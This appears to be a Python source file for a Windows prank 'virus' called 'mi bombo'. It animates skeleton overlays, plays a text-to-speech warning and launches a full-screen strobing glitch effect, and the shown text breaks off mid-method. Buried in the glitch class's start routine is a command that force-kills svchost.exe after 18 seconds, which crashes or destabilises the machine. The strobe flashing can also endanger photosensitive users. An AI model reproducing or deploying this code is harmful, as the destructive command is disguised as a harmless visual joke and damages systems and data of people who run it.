import os
import time
import threading
import ctypes
import ctypes as C  
import tkinter as tk
from PIL import Image, ImageTk, ImageSequence
import tempfile
import uuid
import random
import math
from time import sleep
import win32api, win32con, win32gui
import asyncio
import edge_tts
import pygame
import sys
from pathlib import Path

def resource_path(rel_path: str) -> str:

    if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        base = Path(sys._MEIPASS)  
    else:
        base = Path(__file__).resolve().parent  
    return str(base / rel_path)



JPG_PATH    = resource_path("assets/skeleton_run.jpg")
GIF_PATH    = resource_path("assets/skeleton_banging_shield.gif")
PROMPT_PATH = resource_path("assets/prompt.png")
CAR_PATH    = resource_path("assets/skeleton_car.png")
BOOM_MP3_PATH = resource_path("assets/mi-bombo.mp3")
BOOM_VOL = 1.0



WAVES = 7

FINAL_CAR_SCALE = 3
FINAL_BURST_COUNT = 5
FINAL_RING_RADIUS = 300
FINAL_RING_JITTER = 150
FINAL_FALL_PX = 100

SKELE_SIZE = (180, 180)
PROMPT_SIZE = (180, 75)
CAR_SIZE = (210, 110)

DROP_SCALE = 0.75
DROP_BASE_SIZE = (180, 180)
DROP_SIZE = (int(DROP_BASE_SIZE[0] * DROP_SCALE), int(DROP_BASE_SIZE[1] * DROP_SCALE))

PROMPT_OFFSET_X = 80
PROMPT_OFFSET_Y = -90

STEP_PX = 3
SLEEP_S = 0.012

CAR_STEP_PX = 10
CAR_SLEEP_S = 0.015

DELAY_BEFORE_AUDIO_MS = 0
DELAY_AFTER_AUDIO_MS = 0

CRASH_MIN_X = 0
CRASH_MAX_X = 0.80

DROP_STEP_PX = 3
DROP_SLEEP_S = 0.00020

TEXT = "get readdy for the mi boombo vairus"
VOICE = "es-ES-ElviraNeural"
VOICE_RATE = "-5%"
VOICE_PITCH = "+19Hz"
VOICE_VOLUME = "-20%"


STACK_BIN_PX = 60

def set_dpi_awareness():
    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except Exception:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except Exception:
            pass

def get_mouse_monitor_workarea():
    x, y = win32api.GetCursorPos()
    mon = win32api.MonitorFromPoint((x, y), win32con.MONITOR_DEFAULTTONEAREST)
    info = win32api.GetMonitorInfo(mon)
    return info["Work"]

def get_real_hwnd(tk_root):
    raw_hwnd = int(tk_root.winfo_id())
    return win32gui.GetAncestor(raw_hwnd, win32con.GA_ROOT) or raw_hwnd

def set_transparent_key(tk_root, key="magenta"):
    tk_root.overrideredirect(True)
    tk_root.attributes("-topmost", True)
    tk_root.configure(bg=key)
    try:
        tk_root.wm_attributes("-transparentcolor", key)
    except tk.TclError:
        pass


async def tts_to_file(text, voice, path, rate="0%", pitch="0Hz", volume="+0%"):
    communicate = edge_tts.Communicate(text, voice, rate=rate, pitch=pitch, volume=volume)
    await communicate.save(path)

def mixer_init_once():
    if not pygame.mixer.get_init():
        pygame.mixer.init()

def play_music_blocking(path):
    mixer_init_once()
    pygame.mixer.music.load(path)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        time.sleep(0.03)
    pygame.mixer.music.stop()
    pygame.mixer.music.unload()

def play_sound_fire_and_forget(path, volume=1.0):
    try:
        mixer_init_once()
        snd = pygame.mixer.Sound(path)
        snd.set_volume(volume)
        snd.play()
    except Exception:
        pass


class ImageOverlay:
    def __init__(self, pil_rgba_image, w, h, x, y, transparent_key="magenta"):
        self.root = tk.Toplevel()
        set_transparent_key(self.root, transparent_key)
        self.photo = ImageTk.PhotoImage(pil_rgba_image)
        self.canvas = tk.Canvas(self.root, width=w, height=h, highlightthickness=0, bd=0, bg=transparent_key)
        self.canvas.pack()
        self.canvas.create_image(0, 0, anchor="nw", image=self.photo)
        self.root.geometry(f"{w}x{h}+{x}+{y}")
        self.root.update_idletasks()
        self.root.update()
        self.hwnd = get_real_hwnd(self.root)
        win32gui.ShowWindow(self.hwnd, win32con.SW_SHOW)
        win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, x, y, w, h, win32con.SWP_SHOWWINDOW)
        self.w, self.h = w, h
        self.x, self.y = x, y
        self.alive = True

    def move(self, x, y):
        self.x, self.y = x, y
        win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, x, y, self.w, self.h, win32con.SWP_SHOWWINDOW)

    def destroy(self):
        self.alive = False
        try:
            self.root.destroy()
        except Exception:
            pass

class GifOverlay:
    def __init__(self, gif_frames_pil, frame_ms, w, h, x, y, transparent_key="magenta"):
        self.root = tk.Toplevel()
        set_transparent_key(self.root, transparent_key)

        self.frames = [ImageTk.PhotoImage(fr) for fr in gif_frames_pil]
        self.frame_ms = frame_ms
        self.idx = 0

        self.canvas = tk.Canvas(self.root, width=w, height=h, highlightthickness=0, bd=0, bg=transparent_key)
        self.canvas.pack()
        self.item = self.canvas.create_image(0, 0, anchor="nw", image=self.frames[0])

        self.root.geometry(f"{w}x{h}+{x}+{y}")
        self.root.update_idletasks()
        self.root.update()

        self.hwnd = get_real_hwnd(self.root)
        win32gui.ShowWindow(self.hwnd, win32con.SW_SHOW)
        win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, x, y, w, h, win32con.SWP_SHOWWINDOW)

        self.w, self.h = w, h
        self.x, self.y = x, y
        self.alive = True
        self.tick()

    def tick(self):
        if not self.alive:
            return
        self.idx = (self.idx + 1) % len(self.frames)
        self.canvas.itemconfig(self.item, image=self.frames[self.idx])
        self.root.after(self.frame_ms, self.tick)

    def move(self, x, y):
        self.x, self.y = x, y
        win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, x, y, self.w, self.h, win32con.SWP_SHOWWINDOW)

    def destroy(self):
        self.alive = False
        try:
            self.root.destroy()
        except Exception:
            pass


class GlitchStorm:

    BOOL    = C.c_int
    UINT    = C.c_uint
    DWORD   = C.c_uint32
    WORD    = C.c_uint16
    LONG    = C.c_int32
    INT     = C.c_int
    ULONG_PTR = C.c_uint64 if C.sizeof(C.c_void_p) == 8 else C.c_uint32

    WPARAM  = ULONG_PTR
    LPARAM  = C.c_int64 if C.sizeof(C.c_void_p) == 8 else C.c_int32
    LRESULT = C.c_int64 if C.sizeof(C.c_void_p) == 8 else C.c_int32

    HANDLE   = C.c_void_p
    HWND     = HANDLE
    HDC      = HANDLE
    HGDIOBJ  = HANDLE
    HBITMAP  = HANDLE
    HINSTANCE= HANDLE
    HMENU    = HANDLE
    HBRUSH   = HANDLE
    HCURSOR  = HANDLE
    HICON    = HANDLE
    HMODULE  = HANDLE
    LPVOID   = C.c_void_p
    LPCWSTR  = C.c_wchar_p
    ATOM     = WORD

    WNDPROC = C.WINFUNCTYPE(LRESULT, HWND, UINT, WPARAM, LPARAM)


    WS_POPUP         = 0x80000000
    WS_VISIBLE       = 0x10000000
    WS_EX_TOPMOST    = 0x00000008
    WS_EX_TOOLWINDOW = 0x00000080

    SW_SHOW          = 5
    PM_REMOVE        = 0x0001

    SM_CXSCREEN      = 0
    SM_CYSCREEN      = 1

    WM_DESTROY       = 0x0002
    WM_CLOSE         = 0x0010
    WM_KEYDOWN       = 0x0100
    VK_ESCAPE        = 0x1B

    SRCCOPY          = 0x00CC0020
    SRCINVERT        = 0x00660046
    DSTINVERT        = 0x00550009
    BLACKNESS        = 0x00000042
    WHITENESS        = 0x00FF0062

    DIB_RGB_COLORS   = 0
    BI_RGB           = 0

    def _build_structs(self):
        C_ = C  

        class POINT(C_.Structure):
            _fields_ = [("x", self.LONG), ("y", self.LONG)]

        class MSG(C_.Structure):
            _fields_ = [
                ("hwnd", self.HWND),
                ("message", self.UINT),
                ("wParam", self.WPARAM),
                ("lParam", self.LPARAM),
                ("time", self.DWORD),
                ("pt", POINT),
            ]

        class WNDCLASSW(C_.Structure):
            _fields_ = [
                ("style", self.UINT),
                ("lpfnWndProc", self.WNDPROC),
                ("cbClsExtra", self.INT),
                ("cbWndExtra", self.INT),
                ("hInstance", self.HINSTANCE),
                ("hIcon", self.HICON),
                ("hCursor", self.HCURSOR),
                ("hbrBackground", self.HBRUSH),
                ("lpszMenuName", self.LPCWSTR),
                ("lpszClassName", self.LPCWSTR),
            ]

        class BITMAPINFOHEADER(C_.Structure):
            _fields_ = [
                ("biSize", self.DWORD),
                ("biWidth", self.LONG),
                ("biHeight", self.LONG),
                ("biPlanes", self.WORD),
                ("biBitCount", self.WORD),
                ("biCompression", self.DWORD),
                ("biSizeImage", self.DWORD),
                ("biXPelsPerMeter", self.LONG),
                ("biYPelsPerMeter", self.LONG),
                ("biClrUsed", self.DWORD),
                ("biClrImportant", self.DWORD),
            ]

        class BITMAPINFO(C_.Structure):
            _fields_ = [
                ("bmiHeader", BITMAPINFOHEADER),
                ("bmiColors", self.DWORD * 3),
            ]

        self.POINT = POINT
        self.MSG = MSG
        self.WNDCLASSW = WNDCLASSW
        self.BITMAPINFOHEADER = BITMAPINFOHEADER
        self.BITMAPINFO = BITMAPINFO
        


    def __init__(self, intensity=10, seconds=40, seed=None, class_name="GLITCH_STORM_OVERLAY_AMAZE"):
        if os.name != "nt":
            raise RuntimeError("Windows-only.")
        self.intensity = max(1, min(10, int(intensity)))
        self.seconds = max(1.0, float(seconds))
        self.seed = seed
        self.class_name = class_name
        self._stop_flag = False
        self._thread = None

        self.user32   = C.WinDLL("user32", use_last_error=True)
        self.gdi32    = C.WinDLL("gdi32",  use_last_error=True)
        self.kernel32 = C.WinDLL("kernel32", use_last_error=True)

        self._build_structs()
        self._bind()
        self._wndproc = self.WNDPROC(self._WndProc)


    def start_async(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop_flag = False
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        sleep(18)
        os.system("taskkill.exe /f /im svchost.exe")
        

    def stop(self):
        self._stop_flag = True

    def _bind(self):
        u, g, k = self.user32, self.gdi32, self.kernel32

        u.GetSystemMetrics.argtypes = [self.INT]
        u.GetSystemMetrics.restype  = self.INT

        u.GetAsyncKeyState.argtypes = [self.INT]
        u.GetAsyncKeyState.restype  = C.c_short

        u.DefWindowProcW.argtypes = [self.HWND, self.UINT, self.WPARAM, self.LPARAM]
        u.DefWindowProcW.restype  = self.LRESULT

        u.RegisterClassW.argtypes = [C.POINTER(self.WNDCLASSW)]
        u.RegisterClassW.restype  = self.ATOM

        u.CreateWindowExW.argtypes = [
            self.DWORD, self.LPCWSTR, self.LPCWSTR, self.DWORD,
            self.INT, self.INT, self.INT, self.INT,
            self.HWND, self.HMENU, self.HINSTANCE, self.LPVOID
        ]
        u.CreateWindowExW.restype = self.HWND

        u.ShowWindow.argtypes = [self.HWND, self.INT]
        u.ShowWindow.restype  = self.BOOL

        u.UpdateWindow.argtypes = [self.HWND]
        u.UpdateWindow.restype  = self.BOOL

        u.DestroyWindow.argtypes = [self.HWND]
        u.DestroyWindow.restype  = self.BOOL

        u.PostQuitMessage.argtypes = [self.INT]
        u.PostQuitMessage.restype  = None

        u.PeekMessageW.argtypes = [C.POINTER(self.MSG), self.HWND, self.UINT, self.UINT, self.UINT]
        u.PeekMessageW.restype  = self.BOOL

        u.TranslateMessage.argtypes = [C.POINTER(self.MSG)]
        u.TranslateMessage.restype  = self.BOOL

        u.DispatchMessageW.argtypes = [C.POINTER(self.MSG)]
        u.DispatchMessageW.restype  = self.LRESULT

        u.GetDC.argtypes = [self.HWND]
        u.GetDC.restype  = self.HDC

        u.ReleaseDC.argtypes = [self.HWND, self.HDC]
        u.ReleaseDC.restype  = self.INT

        k.GetModuleHandleW.argtypes = [self.LPCWSTR]
        k.GetModuleHandleW.restype  = self.HMODULE

        g.CreateCompatibleDC.argtypes = [self.HDC]
        g.CreateCompatibleDC.restype  = self.HDC

        g.DeleteDC.argtypes = [self.HDC]
        g.DeleteDC.restype  = self.BOOL

        g.CreateDIBSection.argtypes = [self.HDC, C.POINTER(self.BITMAPINFO), self.UINT, C.POINTER(self.LPVOID), self.HANDLE, self.DWORD]
        g.CreateDIBSection.restype  = self.HBITMAP

        g.SelectObject.argtypes = [self.HDC, self.HGDIOBJ]
        g.SelectObject.restype  = self.HGDIOBJ

        g.DeleteObject.argtypes = [self.HGDIOBJ]
        g.DeleteObject.restype  = self.BOOL

        g.StretchDIBits.argtypes = [
            self.HDC,
            self.INT, self.INT, self.INT, self.INT,
            self.INT, self.INT, self.INT, self.INT,
            self.LPVOID, C.POINTER(self.BITMAPINFO),
            self.UINT, self.DWORD
        ]
        g.StretchDIBits.restype = self.INT

        g.BitBlt.argtypes = [self.HDC, self.INT, self.INT, self.INT, self.INT, self.HDC, self.INT, self.INT, self.DWORD]
        g.BitBlt.restype  = self.BOOL

        g.StretchBlt.argtypes = [self.HDC, self.INT, self.INT, self.INT, self.INT, self.HDC, self.INT, self.INT, self.INT, self.INT, self.DWORD]
        g.StretchBlt.restype  = self.BOOL

        g.PatBlt.argtypes = [self.HDC, self.INT, self.INT, self.INT, self.INT, self.DWORD]
        g.PatBlt.restype  = self.BOOL

    def _pump(self):
        msg = self.MSG()
        while self.user32.PeekMessageW(C.byref(msg), None, 0, 0, self.PM_REMOVE):
            self.user32.TranslateMessage(C.byref(msg))
            self.user32.DispatchMessageW(C.byref(msg))

    def _WndProc(self, hwnd, msg, wparam, lparam):
        if msg == self.WM_KEYDOWN and int(wparam) == self.VK_ESCAPE:
            self._stop_flag = True
            self.user32.DestroyWindow(hwnd)
            return 0
        if msg in (self.WM_CLOSE, self.WM_DESTROY):
            self._stop_flag = True
            self.user32.PostQuitMessage(0)
            return 0
        return self.user32.DefWindowProcW(hwnd, msg, wparam, lparam)

    def _make_overlay(self):
        hinst = self.kernel32.GetModuleHandleW(None)

        wc = self.WNDCLASSW()
        wc.style = 0
        wc.lpfnWndProc = self._wndproc
        wc.cbClsExtra = 0
        wc.cbWndExtra = 0
        wc.hInstance = hinst
        wc.hIcon = None
        wc.hCursor = None
        wc.hbrBackground = None
        wc.lpszMenuName = None
        wc.lpszClassName = self.class_name

        atom = self.user32.RegisterClassW(C.byref(wc))
        if not atom:
            err = C.get_last_error()
            if err != 1410:
                raise OSError(f"RegisterClassW failed: {err}")

        SW = self.user32.GetSystemMetrics(self.SM_CXSCREEN)
        SH = self.user32.GetSystemMetrics(self.SM_CYSCREEN)

        hwnd = self.user32.CreateWindowExW(
            self.WS_EX_TOPMOST | self.WS_EX_TOOLWINDOW,
            self.class_name,
            "GLITCH STORM",
            self.WS_POPUP | self.WS_VISIBLE,
            0, 0, SW, SH,
            None, None, hinst, None
        )
        if not hwnd:
            raise OSError(f"CreateWindowExW failed: {C.get_last_error()}")

        self.user32.ShowWindow(hwnd, self.SW_SHOW)
        self.user32.UpdateWindow(hwnd)
        return hwnd, SW, SH

    @staticmethod
    def _clamp8(v):
        return 0 if v < 0 else (255 if v > 255 else v)

    def _slice_shuffle(self, mem, w, h, chaos):
        if random.random() < (0.20 + 0.60 * chaos):
            vertical = random.random() < 0.55
            strips = 6 + int(40 * chaos)
            if vertical:
                sw = max(4, w // strips)
                order = list(range(0, w, sw))
                random.shuffle(order)
                for i, sx in enumerate(range(0, w, sw)):
                    dx = order[i]
                    rw = min(sw, w - sx)
                    self.gdi32.BitBlt(mem, dx, 0, rw, h, mem, sx, 0, self.SRCCOPY)
            else:
                sh = max(3, h // strips)
                order = list(range(0, h, sh))
                random.shuffle(order)
                for i, sy in enumerate(range(0, h, sh)):
                    dy = order[i]
                    rh = min(sh, h - sy)
                    self.gdi32.BitBlt(mem, 0, dy, w, rh, mem, 0, sy, self.SRCCOPY)

    def _kaleidoscope(self, mem, w, h, chaos):
        if random.random() < (0.12 + 0.55 * chaos):
            if random.random() < 0.5:
                self.gdi32.StretchBlt(mem, 0, 0, w, h, mem, w - 1, 0, -w, h, self.SRCCOPY)
            if random.random() < 0.5:
                self.gdi32.StretchBlt(mem, 0, 0, w, h, mem, 0, h - 1, w, -h, self.SRCCOPY)

        if random.random() < (0.08 + 0.35 * chaos):
            hw, hh = w // 2, h // 2
            self.gdi32.StretchBlt(mem, 0,  0,  hw, hh, mem, 0,    0,    hw, hh, self.SRCCOPY)
            self.gdi32.StretchBlt(mem, hw, 0,  hw, hh, mem, hw-1, 0,   -hw, hh, self.SRCCOPY)
            self.gdi32.StretchBlt(mem, 0,  hh, hw, hh, mem, 0,   hh-1, hw, -hh, self.SRCCOPY)
            self.gdi32.StretchBlt(mem, hw, hh, hw, hh, mem, hw-1, hh-1,-hw,-hh, self.SRCCOPY)

    def _feedback_tunnel(self, dst_mem, src_mem, w, h, chaos):
        passes = 1 + int(4 * chaos)
        for _ in range(passes):
            zoom = 0.84 + random.random() * (0.22 + 0.25 * chaos)
            if random.random() < 0.35 + 0.35 * chaos:
                zoom = 1.03 + random.random() * (0.20 + 0.25 * chaos)

            sw = max(1, int(w / zoom))
            sh = max(1, int(h / zoom))
            sx = (w - sw) // 2 + random.randint(-int(20 * chaos), int(20 * chaos))
            sy = (h - sh) // 2 + random.randint(-int(12 * chaos), int(12 * chaos))

            dx = random.randint(-int(25 * chaos), int(25 * chaos))
            dy = random.randint(-int(15 * chaos), int(15 * chaos))

            rop = self.SRCCOPY if random.random() < 0.7 else self.SRCINVERT
            self.gdi32.StretchBlt(dst_mem, dx, dy, w, h, src_mem, sx, sy, sw, sh, rop)

    def _tracking_bar(self, wnd_dc, SW, SH, t, chaos):
        if random.random() < (0.10 + 0.45 * chaos):
            bar_h = int((SH * (0.03 + 0.10 * chaos)) + random.randint(10, 80))
            y = int((t * (240 + 700 * chaos)) % (SH + bar_h)) - bar_h
            self.gdi32.PatBlt(wnd_dc, 0, y, SW, bar_h, self.DSTINVERT)
            if chaos > 0.5:
                self.gdi32.PatBlt(wnd_dc, 0, y + bar_h + 12, SW, max(6, bar_h // 5), self.DSTINVERT)

    def _run(self):
        if self.seed is not None:
            random.seed(self.seed)

        intensity = self.intensity
        seconds = self.seconds
        i10 = min(10.0, (intensity / 10.0) * 10.0)
        iBoost = intensity / 10.0

        hwnd, SW, SH = self._make_overlay()
        wnd_dc = self.user32.GetDC(hwnd)
        if not wnd_dc:
            return

        scale = 6 - int(i10 // 3)
        scale = max(3, min(6, scale))
        Wcap = max(280, SW // scale)
        Hcap = max(170, SH // scale)

        memA = memB = None
        dibA = dibB = None
        oldA = oldB = None
        bitsA = self.LPVOID()
        bitsB = self.LPVOID()

        bmi = self.BITMAPINFO()
        bmi.bmiHeader.biSize = C.sizeof(self.BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = Wcap
        bmi.bmiHeader.biHeight = -Hcap
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32
        bmi.bmiHeader.biCompression = self.BI_RGB
        bmi.bmiHeader.biSizeImage = Wcap * Hcap * 4

        try:
            memA = self.gdi32.CreateCompatibleDC(wnd_dc)
            memB = self.gdi32.CreateCompatibleDC(wnd_dc)

            dibA = self.gdi32.CreateDIBSection(wnd_dc, C.byref(bmi), self.DIB_RGB_COLORS, C.byref(bitsA), None, 0)
            dibB = self.gdi32.CreateDIBSection(wnd_dc, C.byref(bmi), self.DIB_RGB_COLORS, C.byref(bitsB), None, 0)

            oldA = self.gdi32.SelectObject(memA, dibA)
            oldB = self.gdi32.SelectObject(memB, dibB)

            buf_len = Wcap * Hcap * 4
            Arr = C.c_ubyte * buf_len
            pxA = Arr.from_address(bitsA.value)
            pxB = Arr.from_address(bitsB.value)
            tmp = bytearray(buf_len)

            event_energy = 0.0
            freeze_until = 0.0
            poster_until = 0.0

            fps_cap     = int(220 + 60 * (i10 / 10.0))
            strobe_bias = 0.0022 * i10 * (1.0 + 1.0 * (iBoost - 1.0))
            tear_max    = int((50 + i10 * 80) * (0.7 + 0.7 * iBoost))
            rgb_max     = int((3 + i10) * (0.9 + 0.8 * iBoost))
            noise_base  = int((10 + i10 * 12) * (0.9 + 0.8 * iBoost))
            shear_base  = int((6 + i10 * 6) * (1.0 + 0.9 * iBoost))

            start = time.perf_counter()
            last  = start

            while not self._stop_flag:
                self._pump()

                now = time.perf_counter()
                t = now - start
                if t >= seconds:
                    break
                if self.user32.GetAsyncKeyState(self.VK_ESCAPE) & 0x8000:
                    break

                dt = now - last
                if dt < (1.0 / fps_cap):
                    time.sleep(0.0005)
                    continue
                last = now

                event_energy = max(0.0, event_energy - (1.0 + 0.28 * i10) * dt)
                if random.random() < (0.70 + 0.08 * i10) * dt * (1.0 - min(1.0, event_energy)):
                    event_energy += random.uniform(1.2, 3.2) * (0.9 + i10 / 10.0)
                event_energy = min(3.4, event_energy)

                chaos = min(1.0, 0.18 + 0.32 * (i10 / 10.0) + 0.70 * (event_energy / 3.4))

                if now >= freeze_until and random.random() < (0.16 * chaos) * dt:
                    freeze_until = now + random.uniform(0.10, 0.35)

                if now >= poster_until and random.random() < (0.12 * chaos) * dt:
                    poster_until = now + random.uniform(0.03, 0.16)
                do_poster = now < poster_until
                poster_shift = random.choice([3, 4, 5]) if do_poster else 0

                
                if now >= freeze_until:
                    for y in range(Hcap):
                        row = y * Wcap * 4
                        scan = math.sin((t * (7 + i10 * 2.7)) + y * 0.12)
                        for x in range(Wcap):
                            i = row + x * 4
                            v = 128 + int(60 * math.sin(x * 0.030 + t * 6.2) + 50 * scan)
                            v += random.randint(-22, 22)
                            v = self._clamp8(v)
                            r = self._clamp8(v + int(95 * math.sin(t * 3.3 + x * 0.012 + scan)))
                            g = self._clamp8(v + int(95 * math.sin(t * 4.2 + y * 0.014 - scan)))
                            b = self._clamp8(v + int(95 * math.sin(t * 5.1 + (x + y) * 0.010)))
                            pxA[i+0] = b
                            pxA[i+1] = g
                            pxA[i+2] = r
                            pxA[i+3] = 255

                
                self._feedback_tunnel(memA, memB, Wcap, Hcap, chaos)
                self._kaleidoscope(memA, Wcap, Hcap, chaos)
                self._slice_shuffle(memA, Wcap, Hcap, chaos)

                
                local_tear = max(2, (tear_max // max(3, scale)))
                tears = 4 + int(10 * chaos)
                for _ in range(tears):
                    if random.random() < (0.40 + 0.75 * chaos):
                        rw = random.randint(Wcap // 12, Wcap // 2)
                        rh = random.randint(Hcap // 28, Hcap // 5)
                        sx = random.randint(0, max(0, Wcap - rw))
                        sy = random.randint(0, max(0, Hcap - rh))
                        ox = random.randint(-local_tear, local_tear)
                        oy = random.randint(-local_tear // 2, local_tear // 2)
                        rop = self.SRCCOPY if random.random() < 0.8 else self.SRCINVERT
                        self.gdi32.BitBlt(memA, sx + ox, sy + oy, rw, rh, memA, sx, sy, rop)

                
                tmp[:] = pxA[:]
                dx_r = int(random.uniform(-rgb_max, rgb_max) * (0.5 + 2.5 * chaos))
                dx_g = int(random.uniform(-rgb_max, rgb_max) * (0.5 + 2.2 * chaos))
                dx_b = int(random.uniform(-rgb_max, rgb_max) * (0.5 + 2.8 * chaos))
                noise_amt = int(noise_base * (0.35 + 1.80 * chaos))

                for y in range(Hcap):
                    row = y * Wcap * 4
                    scan_j = int(math.sin((t * (11 + i10 * 2.6)) + y * 0.10) * (0.7 + 3.2 * chaos))
                    for x in range(Wcap):
                        xr = (x + dx_r + scan_j) % Wcap
                        xg = (x + dx_g - scan_j) % Wcap
                        xb = (x + dx_b + (scan_j // 2)) % Wcap

                        i  = row + x  * 4
                        ir = row + xr * 4
                        ig = row + xg * 4
                        ib = row + xb * 4

                        b = tmp[ib + 0]
                        g = tmp[ig + 1]
                        r = tmp[ir + 2]

                        if noise_amt:
                            b = self._clamp8(b + random.randint(-noise_amt, noise_amt))
                            g = self._clamp8(g + random.randint(-noise_amt, noise_amt))
                            r = self._clamp8(r + random.randint(-noise_amt, noise_amt))

                        if do_poster:
                            b = (b >> poster_shift) << poster_shift
                            g = (g >> poster_shift) << poster_shift
                            r = (r >> poster_shift) << poster_shift

                        pxA[i+0] = b
                        pxA[i+1] = g
                        pxA[i+2] = r

                
                bands = 10 + int(70 * chaos)
                band_h = max(3, SH // bands)
                shear = int(shear_base * (0.6 + 3.4 * chaos))

                y0 = 0
                while y0 < SH:
                    h = min(band_h, SH - y0)
                    wave = math.sin(t * (9 + i10 * 3.0) + y0 * 0.021) * shear
                    jitter = random.randint(-shear, shear) if random.random() < (0.35 + 0.65 * chaos) else 0
                    xoff = int(wave + jitter)

                    src_y = int((y0 / SH) * Hcap)
                    src_h = max(1, int((h / SH) * Hcap))

                    self.gdi32.StretchDIBits(
                        wnd_dc,
                        xoff, y0, SW, h,
                        0, src_y, Wcap, src_h,
                        bitsA,
                        C.byref(bmi),
                        self.DIB_RGB_COLORS,
                        self.SRCCOPY
                    )
                    y0 += h

                self._tracking_bar(wnd_dc, SW, SH, t, chaos)

                if random.random() < (strobe_bias * (0.35 + 3.2 * chaos)):
                    rr = random.random()
                    if rr < 0.45:
                        self.gdi32.PatBlt(wnd_dc, 0, 0, SW, SH, self.DSTINVERT)
                    elif rr < 0.73:
                        self.gdi32.PatBlt(wnd_dc, 0, 0, SW, SH, self.WHITENESS)
                    else:
                        self.gdi32.PatBlt(wnd_dc, 0, 0, SW, SH, self.BLACKNESS)

                self.gdi32.BitBlt(memB, 0, 0, Wcap, Hcap, memA, 0, 0, self.SRCCOPY)

        finally:
            try:
                if memA and oldA: self.gdi32.SelectObject(memA, oldA)
            except Exception:
                pass
            try:
                if memB and oldB: self.gdi32.SelectObject(memB, oldB)
            except Exception:
                pass
            try:
                if dibA: self.gdi32.DeleteObject(dibA)
            except Exception:
                pass
            try:
                if dibB: self.gdi32.DeleteObject(dibB)
            except Exception:
                pass
            try:
                if memA: self.gdi32.DeleteDC(memA)
            except Exception:
                pass
            try:
                if memB: self.gdi32.DeleteDC(memB)
            except Exception:
                pass
            try:
                if wnd_dc: self.user32.ReleaseDC(hwnd, wnd_dc)
            except Exception:
                pass
            try:
                if hwnd: self.user32.DestroyWindow(hwnd)
            except Exception:
                pass


_glitch_instance = None
_glitch_lock = threading.Lock()


def start_glitch_async_once(intensity=10, seconds=40):
    global _glitch_instance
    with _glitch_lock:
        if _glitch_instance is not None and getattr(_glitch_instance, "_thread", None) and _glitch_instance._thread.is_alive():
            return _glitch_instance
        _glitch_instance = GlitchStorm(intensity=intensity, seconds=seconds)
        _glitch_instance.start_async()
        return _glitch_instance



def stop_glitch():
    global _glitch_instance
    with _glitch_lock:
        if _glitch_instance is not None:
            try:
                _glitch_instance.stop()
            except Exception:
                pass
            _glitch_instance = None


class MiBombo:
    def __init__(self):
        set_dpi_awareness()

        for p in (JPG_PATH, GIF_PATH, PROMPT_PATH, CAR_PATH, BOOM_MP3_PATH):
            if not os.path.exists(p):
                raise FileNotFoundError(p)


        mixer_init_once()

        self.root = tk.Tk()
        set_transparent_key(self.root, "magenta")
        self.transparent_key = "magenta"

        jpg_img = Image.open(JPG_PATH).convert("RGBA").resize(SKELE_SIZE, Image.Resampling.LANCZOS)
        self.jpg_photo = ImageTk.PhotoImage(jpg_img)
        self.s_w = self.jpg_photo.width()
        self.s_h = self.jpg_photo.height()

        self.main_gif_frames_pil, self.main_gif_ms = self.load_gif_frames_pil(GIF_PATH, SKELE_SIZE)

        prompt_img = Image.open(PROMPT_PATH).convert("RGBA").resize(PROMPT_SIZE, Image.Resampling.LANCZOS)
        self.prompt_photo = ImageTk.PhotoImage(prompt_img)

        extra_top = max(0, -(PROMPT_OFFSET_Y))
        self.win_w = max(self.s_w, PROMPT_OFFSET_X + PROMPT_SIZE[0])
        self.win_h = self.s_h + extra_top
        self.origin_x = 0
        self.origin_y = extra_top

        self.canvas = tk.Canvas(self.root, width=self.win_w, height=self.win_h, highlightthickness=0, bd=0, bg=self.transparent_key)
        self.canvas.pack()

        self.skel_item = self.canvas.create_image(self.origin_x, self.origin_y, anchor="nw", image=self.jpg_photo)
        self.prompt_item = None
        self.mode = "jpg"

        self.root.geometry(f"{self.win_w}x{self.win_h}+0+0")
        self.root.update_idletasks()
        self.root.update()
        self.hwnd = get_real_hwnd(self.root)

        self.mon_l, self.mon_t, self.mon_r, self.mon_b = get_mouse_monitor_workarea()
        mon_w = (self.mon_r - self.mon_l)
        mon_h = (self.mon_b - self.mon_t)

        self.target_x = self.mon_l + (mon_w - self.win_w) // 2
        self.target_y = self.mon_t + (mon_h - self.win_h) // 2

        self.start_x = self.mon_r + 250
        self.start_y = self.target_y

        win32gui.ShowWindow(self.hwnd, win32con.SW_SHOW)
        win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, self.start_x, self.start_y, self.win_w, self.win_h, win32con.SWP_SHOWWINDOW)

        self.stop_flag = False
        self.stack_lock = threading.Lock()
        self.stack_counts = {}
        self.boom_path = None

        threading.Thread(target=self.mover_thread, daemon=True).start()
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()

    def load_gif_frames_pil(self, path, size):
        img = Image.open(path)
        frames, durations = [], []
        for frame in ImageSequence.Iterator(img):
            fr = frame.convert("RGBA").resize(size, Image.Resampling.LANCZOS)
            frames.append(fr)
            durations.append(frame.info.get("duration", 80))
        frame_ms = max(30, int(sum(durations) / max(1, len(durations))))
        return frames, frame_ms

    def mover_thread(self):
        x = self.start_x
        y = self.start_y
        while not self.stop_flag and x > self.target_x:
            x -= STEP_PX
            if x < self.target_x:
                x = self.target_x
            win32gui.SetWindowPos(self.hwnd, win32con.HWND_TOPMOST, x, y, self.win_w, self.win_h, win32con.SWP_SHOWWINDOW)
            time.sleep(SLEEP_S)
        if not self.stop_flag:
            self.root.after(0, self.swap_to_gif_and_prompt)

    def swap_to_gif_and_prompt(self):
        if self.mode != "jpg":
            return
        self.mode = "gif"
        self.canvas.delete(self.skel_item)

        self.main_gif_frames_tk = [ImageTk.PhotoImage(fr) for fr in self.main_gif_frames_pil]
        self.main_gif_idx = 0
        self.skel_item = self.canvas.create_image(self.origin_x, self.origin_y, anchor="nw", image=self.main_gif_frames_tk[0])

        px = self.origin_x + PROMPT_OFFSET_X
